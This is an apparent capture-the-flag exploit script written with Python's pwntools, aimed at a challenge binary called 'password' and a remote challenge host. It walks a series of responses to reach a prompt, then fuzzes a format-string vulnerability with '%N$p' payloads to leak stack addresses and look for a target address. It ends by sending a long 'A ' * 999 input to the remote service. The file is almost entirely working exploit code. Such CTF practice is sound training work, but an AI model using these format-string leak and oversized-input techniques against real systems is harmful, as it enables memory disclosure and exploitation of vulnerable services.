from pwn import *

# Target connection details
host = 'ctf-chall.stembascc.com'
port = 6055

target_address = '0x000055555555550f'

# Start fuzzing
for i in range(30):  # Adjust the range if needed
    
    # Establish connection
    # p = remote(host, port)
    p = process("./password")
    # Initial required inputs
    p.sendline("password")
    p.sendline("incorrect")
    p.sendline("again")
    p.sendline("again later")
    
    # Send format string payload
    payload = f"%{i}$p"
    p.sendline(payload)
    
    # Receive the response and extract the leak
    p.recvuntil(b"like this? ")
    main_leak = p.recvline().decode(errors='ignore').strip()
    print(f"Trying %{i}$p: {main_leak}")

    # Check if the target address is found
    if target_address in main_leak:
        print(f"Found target address at %{i}$p!")
        p.close()
        break
    
    # Close connection if not found
    p.close()

# Send large input to close if needed
p = remote(host, port)
p.sendline("password")
p.sendline("incorrect")
p.sendline("again")
p.sendline("again later")
p.sendline("A " * 999)
p.close()
